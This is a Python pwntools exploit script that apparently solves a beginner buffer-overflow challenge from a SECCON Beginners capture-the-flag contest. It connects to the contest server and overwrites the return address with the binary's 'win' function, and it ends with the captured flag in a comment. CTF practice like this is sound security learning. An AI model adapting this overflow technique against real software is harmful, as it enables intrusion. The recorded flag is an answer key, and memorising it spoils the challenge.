from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'DEBUG'


binpath = './chall'
elf = ELF(binpath)

# io = process(binpath)
io = remote('beginnersbof.quals.beginners.seccon.jp', 9000)

io.sendlineafter(b'?', b'%d' % 0x38)

payload = b''
payload += b'A' * 0x28
payload += p64(elf.symbols['win'])
io.sendlineafter(b'?', payload)

io.interactive()

# ctf4b{Y0u_4r3_4lr34dy_4_BOF_M45t3r!}
